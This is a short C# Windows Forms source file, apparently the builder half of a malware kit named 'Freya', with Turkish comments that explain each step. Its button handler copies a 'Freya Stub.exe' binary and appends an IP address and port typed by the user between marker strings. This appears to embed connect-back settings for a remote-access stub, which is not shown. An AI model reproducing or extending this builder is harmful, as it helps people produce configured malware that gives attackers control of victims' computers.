using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace Freya_Builder
{
    public partial class Form1 : Form
    {
        public Form1()
        {
            InitializeComponent();
        }

        private void button1_Click(object sender, EventArgs e)
        {

            File.Copy(Application.StartupPath + "/Freya Stub.exe", Application.StartupPath + "/NewStub.exe"); //Burada STUB'un bi' kopyasını oluşturacağız. Application.StartupPath sadece Windows.Forms'larda var , Console kullanıyorsanız Environment.CurrentDirectory+"\STUB.exe" şeklinde yapabilirsiniz.
            FileStream fs = new FileStream(Application.StartupPath + "/NewStub.exe", FileMode.Append); //FileMode'un Append olmasının sebebi sona yazdıracağız.
            BinaryWriter bw = new BinaryWriter(fs);

            string IP = textBox1.Text;
            int Port = Convert.ToInt32(textBox2.Text);

            bw.Write("StartIP:" + IP + ":EndIP");
            bw.Write("StartPort:" + Port + ":EndPort");
            bw.Flush();
            bw.Close();
            fs.Close();

        }
    }
}
